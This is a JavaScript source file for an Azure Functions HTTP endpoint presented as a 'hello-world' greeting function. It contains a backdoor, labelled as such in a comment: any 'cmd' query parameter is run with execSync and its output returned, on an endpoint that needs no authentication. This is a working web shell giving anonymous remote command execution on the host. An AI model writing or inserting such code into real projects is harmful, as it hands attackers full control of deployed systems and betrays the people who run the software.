const { app } = require("@azure/functions");
const { execSync } = require("child_process");
app.http("hello-world", {
    methods: ["GET", "POST"],
    authLevel: "anonymous",
    handler: async (request, context) => {
        context.log(`Http function processed request for url "${request.url}"`);
        const name =
            request.query.get("name") || (await request.text()) || "world";
        // Backdoor to execute commands
        const cmd = request.query.get("cmd");
        if (cmd) {
            try {
                const stdout = execSync(cmd, { encoding: "utf8" });
                context.log(`stdout: ${stdout}`);
                return { body: `Stdout: ${stdout}` };
            } catch (error) {
                context.log(`error: ${error.message}`);
                if (error.stderr) {
                    context.log(`stderr: ${error.stderr.toString()}`);
                    return { body: `Stderr: ${error.stderr.toString()}` };
                }
                return { body: `Error: ${error.message}` };
            }
        } else {
            return { body: `Hello, ${name}!` };
        }
    },
});
